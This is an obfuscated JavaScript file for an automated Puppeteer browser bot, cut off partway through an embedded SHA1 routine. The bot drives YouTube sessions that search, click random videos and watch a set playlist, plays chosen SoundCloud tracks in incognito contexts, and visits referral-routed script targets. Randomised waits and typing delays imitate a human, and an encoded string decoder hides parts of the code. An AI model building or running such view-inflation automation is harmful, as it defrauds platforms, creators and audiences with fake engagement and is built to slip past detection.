const a3 = c,
  a2 = d,
  Z = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x164b + 0x1 * -0x1c6 + 0xa42 * -0x2))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x97e + 0x105d + -0x19db), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x8e15 + 0x1b * 0x327 + 0x2b8a * 0x4 + (-0x6677 + 0x5e7 + 0x9b28 * 0x1) * random()) : await standardWaitForNetIdle(f), await wait(-0x386 * 0x5 + 0x467 + 0x20bf + (-0x14a8 + -0x1 * 0x22fd + 0x5eb5) * random()), 0x2d * 0x3f + 0x88a + -0x1 * 0x139c;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x515 + 0x1 * -0xa05 + -0x12 * -0x15c), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1 * 0x2173 + 0x5 * 0x37c + 0x196f * -0x2;
}
async function randomWait() {
  return await wait(0x439 * -0x8 + 0x60b + 0x2f45 + (0x14b8 + -0x322 + 0xa6 * 0x3) * random()), -0x45 * -0x3b + -0x2 * -0x1006 + -0x2ff2;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x379 + -0x69 * -0x20 + -0x9a7, -0x1 * -0xe6b + -0x4d * -0x1 + -0xeb1 * 0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x359e * 0x1 + -0x12aa3 + 0x1df65) * getRandomInt(-0x1 * -0x1813 + -0x836 * -0x4 + 0x11 * -0x359, 0x2443 + 0x2053 + -0x4491), h)), -0xc77 * -0x1 + 0x2b * 0x59 + -0x1b69;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x1 * 0x22f4 + 0x9f1 + -0x2ce5;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x13a * 0x5 + -0x9de + 0x1001]['split']('\x20');
    for (let k = 0xbce * -0x1 + -0x1668 + 0x2236; k < i['length']; k += -0x4f7 * 0x1 + 0x32 * -0x6d + 0x1a43)
      j += i[k] * h[i[k + (-0x8e * -0xe + 0xdc1 * 0x1 + -0x36 * 0x66)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = c,
      R = b,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0xcb5 * -0x1 + 0x3ed + 0x84e * -0x2)['map'](l => Array[R(0x1d, 'K#f^')](l['children']))['flat'](0xca * 0x2 + -0x1a28 + 0x1895)[S(0x1b)](l => l['childNodes'][0x1302 + 0x8f8 + -0x1bf9]['childNodes'][0xbce + 0x1 * -0x473 + -0x10d * 0x7]['childNodes'][0x1 * -0x12af + 0x1a51 + -0x1f * 0x3f]['childNodes'][-0x55a + -0x23c1 + 0x291b]['childNodes'][0x21e2 + -0xaa5 + -0x173c]);
    var k;
    return (k = j)[Math['floor'](Math[S(0x17)]() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x2e * -0x45 + 0x8c7 + -0x1145 * 0x1, 0x1e13 + 0x61 * -0x57 + 0x166c)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x9 * 0xb2 + -0x1164 + 0x523e);
  const h = await getMaxTime(f),
    i = Math['min']((0x1c7 * 0xdb + -0x12a57 + 0x8f7a) * getRandomInt(-0x4 * 0x3c7 + 0x1dcd * 0x1 + -0xeaf, 0x7b2 + -0x24b6 + 0x1d09), h);
  return await wait(i), -0xc5b * 0x1 + -0x2 * 0x7a0 + -0x3 * -0x934;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0xd67 + -0xeb7 + 0x1c1e);
    let h = e[f];
    if (b['OPLnng'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1 * -0x919 + 0x1bca * 0x1 + 0x37 * -0x57, s, t, u = 0x1 * 0x941 + 0x89 * 0x13 + -0x136c; t = n['charAt'](u++); ~t && (s = r % (0x226e * -0x1 + 0x8 * 0x1a8 + -0x1532 * -0x1) ? s * (-0xe62 + -0xe8 * 0x1 + 0x22 * 0x75) + t : t, r++ % (0xcc8 + -0x1bcc * -0x1 + -0x2890)) ? p += String['fromCharCode'](0x1d63 + 0x3 * 0xcaa + -0x4262 & s >> (-(-0x16e + -0x47c + 0x5ec) * r & 0x1c45 + 0x1 * -0x232 + 0x39 * -0x75)) : -0x1e01 + -0x2 * -0x167 + 0x1b33) {
          t = o['indexOf'](t);
        }
        for (let v = -0x5 * -0x5c1 + 0x12 * 0x15 + 0x1d * -0x10b, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x51a * 0x1 + 0xa20 + 0x2 * -0x795))['slice'](-(0x1e09 + -0x1 * 0x4ff + -0x1908));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x3e * -0x80 + 0x170 * 0x3 + 0x1ab0,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x15ae + -0x58e + -0x102 * 0x10; u < 0x2562 + 0x1 * -0x1814 + -0x1 * 0xc4e; u++) {
          p[u] = u;
        }
        for (u = -0xa8 * -0x10 + -0xa7b * 0x3 + 0x14f1 * 0x1; u < 0x30e * -0x4 + -0x1 * 0x773 + -0x197 * -0xd; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1ce9 * 0x1 + 0xa62 + -0x264b), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x20d4 * -0x1 + 0xc77 + 0xd * 0x191, q = 0x3 * -0x98a + -0x8bd * -0x4 + -0x656;
        for (let v = -0x13a * 0x5 + -0x9de + 0x1000; v < n['length']; v++) {
          u = (u + (0xbce * -0x1 + -0x1668 + 0x2237)) % (-0x4f7 * 0x1 + 0x32 * -0x6d + 0x1b41), q = (q + p[u]) % (-0x8e * -0xe + 0xdc1 * 0x1 + -0x33 * 0x67), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0xcb5 * -0x1 + 0x3ed + 0x29b * -0x6)]);
        }
        return t;
      };
      b['VfmKFx'] = m, c = arguments, b['OPLnng'] = !![];
    }
    const j = e[0xca * 0x2 + -0x1a28 + 0x1894],
      k = f + j,
      l = c[k];
    return !l ? (b['hiBFIa'] === undefined && (b['hiBFIa'] = !![]), h = b['VfmKFx'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0xd67 + -0xeb7 + 0x1c1e);
    let h = e[f];
    if (c['HvSocu'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1 * -0x919 + 0x1bca * 0x1 + 0x37 * -0x57, r, s, t = 0x1 * 0x941 + 0x89 * 0x13 + -0x136c; s = m['charAt'](t++); ~s && (r = q % (0x226e * -0x1 + 0x8 * 0x1a8 + -0x1532 * -0x1) ? r * (-0xe62 + -0xe8 * 0x1 + 0x22 * 0x75) + s : s, q++ % (0xcc8 + -0x1bcc * -0x1 + -0x2890)) ? o += String['fromCharCode'](0x1d63 + 0x3 * 0xcaa + -0x4262 & r >> (-(-0x16e + -0x47c + 0x5ec) * q & 0x1c45 + 0x1 * -0x232 + 0x39 * -0x75)) : -0x1e01 + -0x2 * -0x167 + 0x1b33) {
          s = n['indexOf'](s);
        }
        for (let u = -0x5 * -0x5c1 + 0x12 * 0x15 + 0x1d * -0x10b, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x51a * 0x1 + 0xa20 + 0x2 * -0x795))['slice'](-(0x1e09 + -0x1 * 0x4ff + -0x1908));
        }
        return decodeURIComponent(p);
      };
      c['URimvh'] = i, b = arguments, c['HvSocu'] = !![];
    }
    const j = e[0x3e * -0x80 + 0x170 * 0x3 + 0x1ab0],
      k = f + j,
      l = b[k];
    return !l ? (h = c['URimvh'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x2489 + 0xd18 + 0xe7 * -0x37]['children'][-0x82f + -0x5c6 * 0x6 + 0x241 * 0x13]['children'][-0x122c + -0x1300 + 0x252c]['children'][0x1 * -0x99e + -0x1 * 0x5cf + 0xf6d]['children'][-0x1616 * 0x1 + 0x507 * -0x5 + 0x2f39]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x7 * -0x232 + 0x29e + 0xcc1;
}
async function searchAndView(f) {
  const T = b;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type'](T(0x14, 'kJe!') + 'oxReal', searchTerms['random'](), {
    'delay': -0x2 * -0xcf7 + -0x779 * 0x3 + -0x31f + (0x2548 + 0x52a * 0x5 + -0x3ee8) * random()
  }), await wait(0x152f + -0xceb * 0x3 + -0x2ca * -0x7 + (-0x23dd + 0x179c + -0x1 * -0xd6d) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x22 * -0xcc + -0x4 * 0x712 + 0x132]['childNodes'][-0x5 * 0x5df + -0x1e3c + 0x3b98]['childNodes'][-0x1473 + -0x9ad + 0x1e21 * 0x1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x128b + -0xb4e + -0xeef * -0x2]['childNodes'][0x12fb * 0x1 + -0x4 * 0xb5 + 0x5 * -0x33b]['childNodes'][-0x388 * -0x6 + 0x168 + 0x2 * -0xb4b]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0xe54 + -0x211d + 0x1 * 0x2f72),
          r = 0x16f * 0x3 + 0x1 * 0xccf + 0x3 * -0x5b4;
        for (let u = -0x1 * 0xcdb + 0x1c0b + -0xf30; u < q['length']; u += 0xbf * -0xb + -0xe2b + -0x3bb * -0x6)
          r += q[u] * k[q[u + (-0x1 * -0x11b2 + 0x31 * -0xae + 0xf9d)]];
        return r;
      }(n);
  });
  await wait((0x104 + -0xff3 + 0x4987) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x7b22 * 0x2 + 0x172d * 0x2 + 0x1b24a) * getRandomInt(-0x1 * 0x1bdb + -0x1f00 + -0x1d6e * -0x2, -0x1 * -0xc13 + -0x3 * -0x67 + -0xd3e * 0x1), h + (-0x41f * -0x2 + 0x1 * -0x897 + 0x1 * 0x13e1));
  return await wait(i), -0x92 * -0x22 + 0x1 * 0xe4e + -0x21b1;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0xd67 + -0xeb7 + 0x1c1e);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x201b + 0x3a * 0xb + -0x13 * -0x18f), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    const U = c;
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f[U(0xf)](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1017 * -0x1 + 0xfa1 + 0x400 * -0x5 + (-0x9 * 0x437 + -0x12df + 0x3cb6 * 0x1) * Math['random']());
    });
  }, 0x3 * 0x6cd + -0x2160 + 0x2851);
  await wait(0x17c19 * -0x3 + 0x1 * 0x5d37f + 0x334ac);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x19d81 + 0xf3ea + -0x22f * -0xb9) * getRandomInt(-0x217f * -0x1 + 0x14e6 + 0x1 * -0x3661, 0x1a3 * -0xe + 0x122 * -0x1d + 0x2a9 * 0x15)), clearInterval(h), -0x18e * -0x1 + -0xc7f + 0xaf2;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x485 + -0x1 * 0x187b + 0x740 * 0x4;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0xc * -0x296 + 0x2279 + -0x4180;
    await randomWait();
  }
  return 0x513 + -0xb50 + -0x5e * -0x11;
}

function fetchRandomSC() {
  return Math['random']() <= 0x2357 * -0x1 + -0x1afd + -0x1f2a * -0x2 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0xec0 + 0x116 * -0xf + 0x18a + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const X = b,
      W = d,
      V = c;
    if (doFlags[V(0x22) + 'ud'] && Math['random']() >= -0x325 * -0x6 + -0x1 * -0x2557 + -0x3835 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x13 * 0x74 + 0xf53 * -0x1 + 0x1 * 0x17ef;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x2d35 + 0xab * 0x13d + 0xa * -0x81e + getRandomInt(-0xb0d + -0x72b7 + 0xb85c, -0x7372 + 0x1bf + 0xe6e3));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x67 * -0x5 + -0x2 * 0x779 + 0xcf0), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1 * -0xd0d + -0x8c2 + 0x15cf;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r[W(0x5)](), i();
      const v = await s[X(0x21, 'Yo*N')]('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x28 * 0x35 + -0x2 * 0x664 + 0xc0 * 0x6, -0x1946 + 0x11ba + -0x1 * -0x7be)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1658 + 0x65a + 0x252 * -0x9 + floor((0x1fd * -0x13 + 0x9e * -0x1d + -0x1 * -0x3b95) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x2 * 0x5f68652d + 0x3 * 0x484666c6 + 0x65fd9608),
          0x1 * -0x82f897 + -0x353cba + 0x1383551,
          -0x3b14 * -0x1 + 0xa3ce + 0x15b * -0x46,
          0x266f + -0x6f7 * 0x1 + 0x3df * -0x8
        ], y = [
          -0x25a2 + 0x5d0 + -0x662 * -0x5,
          -0x1345 + 0x980 + 0x9d5,
          0x3 * -0x8bf + -0xbcb + -0x38 * -0xae,
          0x65 * 0x3d + 0x1439 + -0x2c4a
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1cd * -0x13 + 0x1 * 0x1f46 + 0x2f2)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x3 * -0x225 + -0x737 * 0x2 + -0x59 * -0x17; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x31e + -0x124c + 0xf2e) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x13ff + 0xfa * 0x25 + -0x1023] = A[0x14d1 + 0x5 * -0x281 + -0x83c] = A[0x2267 * 0x1 + -0x1c7a + -0x5ec] = A[-0x974 + 0x2603 + -0x1c8d] = A[0x24 * -0xdd + -0x8c4 + 0x27db] = A[0xd4 + -0x5b * -0x20 + -0xc30] = A[-0x16e1 + 0x5bb * 0x1 + -0x112b * -0x1] = A[0x20ac + 0x10a + 0x9a * -0x38] = A[0x1 * -0x2363 + -0x94d + 0x2cb7] = A[0x146f * -0x1 + -0x1127 + 0x259e] = A[0x731 + -0x31 * 0x82 + 0x11ba] = A[-0xc8a + -0x506 * 0x4 + 0x20ac] = A[-0x1457 + 0x3 * -0xcc3 + 0x3aab] = A[0x2406 + -0x1361 + -0x1099 * 0x1] = A[-0x2434 + -0x2 * 0x38c + 0x2b59] = A[0x1f3 * -0xb + 0x9 * 0x42f + -0x1028] = A[-0x1df9 + 0x1806 + 0x602] = 0xab2 + 0x25 * -0xc + 0x1 * -0x8f6, this['blocks'] = A) : this['blocks'] = [
                -0x244e * 0x1 + 0x627 + -0x1f * -0xf9,
                0x2 * -0x63d + -0xa5e + 0x16d8,
                0x3 * -0x191 + -0x12a1 * 0x2 + 0x29f5,
                0x16a2 * -0x1 + -0x6e * -0x42 + -0x5ba * 0x1,
                -0x220a + 0x15b + -0x1 * -0x20af,
                0x18 * -0x7a + -0x7e3 + 0x1353,
                -0x81b * -0x2 + 0x15 * -0x1d3 + 0x1619,
                -0x1d3b + 0x19ca + -0x371 * -0x1,
                -0x11d + 0x94d + -0x418 * 0x2,
                -0x9 * -0x3d2 + -0x7 * -0x585 + -0x4905,
                0x1 * 0x1b28 + -0x1 * -0x81b + 0x2343 * -0x1,
                -0x1825 * -0x1 + -0x19 * -0x1 + -0x3a * 0x6b,
                -0x544 + 0x1 * 0x2222 + -0x1cde,
                -0x1546 + 0x1b49 + 0x201 * -0x3,
                0x16bc + -0x12 * -0x1c6 + -0x36a8,
                -0x20ea + 0x2 * -0x610 + 0x1685 * 0x2,
                0x1aa8 + -0x2b * -0x59 + 0x1 * -0x299b
              ], this['h0'] = -0x5b48be04 + 0x1f * -0x40890ee + 0x13f976dd7, this['h1'] = 0x71c019c6 + -0x980bfb93 + -0x116198d56 * -0x1, this['h2'] = 0xb * -0x179d5a78 + 0x19c2b1 * -0x4e0 + 0x21a12df06, this['h3'] = -0x33efeac + -0x25 * 0x38f41 + 0x13f50787, this['h4'] = 0xa1860386 + 0xe491b4 * -0x7d + 0x91e8034e, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x12c2 + -0x6e * -0x32 + -0x283e, this['finalized'] = this['hashed'] = 0x18f3 + -0x1 * 0x152e + -0x3c5, this['first'] = 0xd78 + -0x1239 + 0x4c2;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * 0x1561 + -0x2638 + 0x10d7, O = J['length'] || 0x1f6 + 0x616 * 0x1 + -0x2 * 0x406, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x3 * -0x9b3 + 0x2679 + -0x4392, P[0x1865 * 0x1 + 0x2333 + -0x8 * 0x773] = this['block'], P[-0xf1e + -0x8 * -0x3cb + -0xf2a] = P[-0x1cf * -0x5 + 0x14fc + -0x1e06] = P[0x210e + 0x13f1 + -0x34fd] = P[-0x269 * 0xf + -0x1 * 0x699 + 0x2ac3] = P[-0x2471 + 0xd8 + 0x239d * 0x1] = P[0x1748 + 0x1deb + -0x352e] = P[0x24c8 + -0xbaa * 0x1 + -0x1918] = P[0x11c7 + -0x1529 + 0x9 * 0x61] = P[-0x5 * -0xa7 + -0x1a9 * 0x16 + 0x214b] = P[0x1cf8 + -0xff6 + -0xcf9] = P[0x5bf + 0xa48 + 0x1 * -0xffd] = P[-0x1 * -0x24af + 0x26bb + -0x4b5f] = P[-0x2b * -0xdf + -0x1e68 + -0x701] = P[0x1 * -0xc22 + -0x10e9 + 0x746 * 0x4] = P[0x131b + 0x17 * 0xbb + 0x1a * -0x161] = P[0x8ea + 0xab5 * -0x1 + 0x3 * 0x9e] = 0x1bad + -0xc74 + -0x1b1 * 0x9), K) {
                    for (N = this['start']; M < O && N < -0x12ba + 0xde * 0xe + 0x6d6; ++M)
                      P[N >> -0x1900 + -0x24f9 * -0x1 + -0xbf7] |= J[M] << y[0x1cc9 + 0x1 * 0x17dd + -0x34a3 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x10d0 + 0x800 * 0x2 + 0x1048 * -0x2; ++M)
                      (L = J['charCodeAt'](M)) < 0x1 * 0xecb + -0x35 + 0xe16 * -0x1 ? P[N >> -0x15 * -0x16f + -0x617 + -0x1802] |= L << y[0x1 * -0x194d + 0x1 * 0x48e + 0x14c2 * 0x1 & N++] : L < -0x9 * -0x16a + -0x1782 + 0x964 * 0x2 ? (P[N >> 0x11ba + 0x30c + 0xa62 * -0x2] |= (-0x248a + -0x199f + 0x3ee9 | L >> -0x7a * -0x19 + 0x98a + -0x1a6 * 0xd) << y[-0x236e * -0x1 + -0x1685 + 0x1a * -0x7f & N++], P[N >> -0x1a + 0x37e * -0x4 + -0x44 * -0x35] |= (-0x822 + -0x11f7 + 0x1a99 | -0x7f7 + 0x12d8 + -0xaa2 & L) << y[0x1 * -0xbb9 + 0x19c8 + -0x4 * 0x383 & N++]) : L < -0x1273f * 0x1 + 0x92af * 0x2 + 0x1 * 0xd9e1 || L >= -0x4114 * 0x2 + -0x9f81 * 0x1 + -0x1 * -0x201a9 ? (P[N >> -0x269f + -0x2 * 0x627 + 0x32ef] |= (0x120e + -0x918 + -0x1 * 0x816 | L >> 0x8 * -0x442 + -0x210c + 0x4328) << y[-0x1b24 + 0x2 * -0x118c + 0x3e3f & N++], P[N >> -0x240e + 0x27b * -0x9 + -0x3a63 * -0x1] |= (-0x13a0 + -0x178 * 0x1 + 0x566 * 0x4 | L >> -0x1c47 * 0x1 + 0x1535 + -0xe3 * -0x8 & 0x1f6 * 0x10 + 0x1896 + -0x347 * 0x11) << y[0x1d * 0xd8 + 0x1 * -0xe17 + 0xa5e * -0x1 & N++], P[N >> -0x37f + -0xa8 * 0x11 + 0xea9] |= (-0x2 * -0x1223 + 0x2b0 * 0x4 + 0x1743 * -0x2 | -0x8ee + 0x1cdb * -0x1 + -0x8 * -0x4c1 & L) << y[-0x9 * 0x1ef + 0x1 * 0x2433 + -0x12c9 & N++]) : (L = -0x167 * -0x135 + -0xc5e7 + 0x1494 + ((-0x1542 + -0x12d * -0x19 + -0x424 & L) << -0x4fa + -0x3 * -0xb8d + -0x3 * 0x9e1 | -0x1271 + -0xe4b + 0x1 * 0x24bb & J['charCodeAt'](++M)), P[N >> 0x45 * 0x85 + 0x3 * -0x9b6 + -0x65 * 0x11] |= (0x1b5f + 0xcd7 * -0x1 + 0x28 * -0x57 | L >> -0x178a + -0xacf * 0x1 + 0x9 * 0x3d3) << y[0x1469 + -0x1c0b + 0x7a5 & N++], P[N >> 0x2 * 0x4f3 + 0x34 * 0x43 + 0x80 * -0x2f] |= (0xa2b + -0x1a33 + 0x1088 | L >> -0x2579 + 0xf36 + 0x164f & -0x798 + -0x1264 + 0x1a3b) << y[-0x1138 + -0xf1e + 0x2059 & N++], P[N >> -0x9 * -0x31d + 0x4 * -0x741 + 0x101] |= (-0x35 * 0x5f + -0x1e26 + 0x3251 | L >> -0x19d1 * -0x1 + 0x1d42 + -0x370d & 0x1bbc + 0xe * 0xcb + -0x2697) << y[-0x1667 + 0x963 + 0xd07 & N++], P[N >> 0x9f3 + -0x643 * 0x2 + 0x295] |= (0xae3 + -0x3 * -0xa9d + -0x2a3a | 